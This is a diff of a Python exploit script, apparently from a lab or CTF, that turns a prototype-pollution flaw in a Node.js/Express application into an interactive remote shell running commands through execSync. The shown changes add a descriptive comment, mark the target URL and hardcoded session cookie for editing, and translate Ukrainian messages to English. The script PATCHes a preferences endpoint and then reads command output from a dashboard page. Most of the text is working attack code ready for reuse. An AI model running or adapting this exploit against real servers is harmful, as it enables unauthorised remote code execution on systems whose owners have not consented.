@@ -1,12 +1,15 @@
+
+# In this script demostrated a Prototype Pollution vulnerability with Node.js && Express stack via Base64 decoding , execSync() with a error massage to stdout because an application renders only error
+
 #!/usr/bin/env python3
 import requests
 import re
 import base64
 from html import unescape
 
-BASE_URL = "http://a744c1200ac8c489fa88188776c95403-874749701.us-west-2.elb.amazonaws.com:3000"
-PATCH_URL = f"{BASE_URL}/api/preferences/notifications"
-TRIGGER_URL = f"{BASE_URL}/dashboard"
+BASE_URL = "http://a744c1200ac8c489fa88188776c95403-874749701.us-west-2.elb.amazonaws.com:3000" # CHANGE
+PATCH_URL = f"{BASE_URL}/api/preferences/notifications" # CHANGE
+TRIGGER_URL = f"{BASE_URL}/dashboard" # CHANGE
 
 SESSION_COOKIE = "connect.sid=s%3AB6LoqrB2qF7Jrpw2WKbwHBE_UJpn_TKh.tjoowlq%2FBiphwkWbrhqH%2BoKWXGD4EW2MKMzZHGtLcW8"  # CHANGE
 
@@ -38,7 +41,7 @@ def execute(cmd):
 
     patch_resp = s.patch(PATCH_URL, json=payload, headers=headers)
     if patch_resp.status_code not in (200, 204):
-        return f"[!] PATCH failed: {patch_resp.status_code} — перевір SESSION_COOKIE"
+        return f"[!] PATCH failed: {patch_resp.status_code} — check SESSION_COOKIE"
 
     resp = s.get(TRIGGER_URL, headers=headers)
     return parse(resp.text)
@@ -58,7 +61,7 @@ def parse(html):
 
 if __name__ == "__main__":
     if not SESSION_COOKIE:
-        print("[!] Встав SESSION_COOKIE в скрипт")
+        print("[!] Put SESSION_COOKIE into a script")
         exit(1)
 
     print("[*] Prototype Pollution RCE shell")
